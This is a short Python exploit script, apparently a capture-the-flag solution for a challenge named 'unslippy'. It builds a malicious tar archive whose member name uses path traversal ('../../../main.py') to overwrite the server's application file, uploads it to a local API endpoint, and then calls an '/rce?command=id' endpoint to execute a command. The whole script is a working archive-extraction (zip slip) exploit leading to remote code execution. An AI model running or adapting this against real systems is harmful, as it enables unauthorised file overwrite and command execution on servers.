import requests, time, tarfile

s = requests.session()

url = 'http://0.0.0.0:1337/api/unslippy'

#os.system('python2 tool/evilarc.py -d 3 -o u -f tool/malcious.tar.gz tool/main.py')

tf = tarfile.open("tool/malcious.tar.gz", "w:gz")
tf.add("tool/main.py", "../../../main.py")
tf.close()

s.post(url, files={'file':open('tool/malcious.tar.gz','rb')})

time.sleep(2)

res = s.get("http://0.0.0.0:1337/rce?command=id").text

print(res)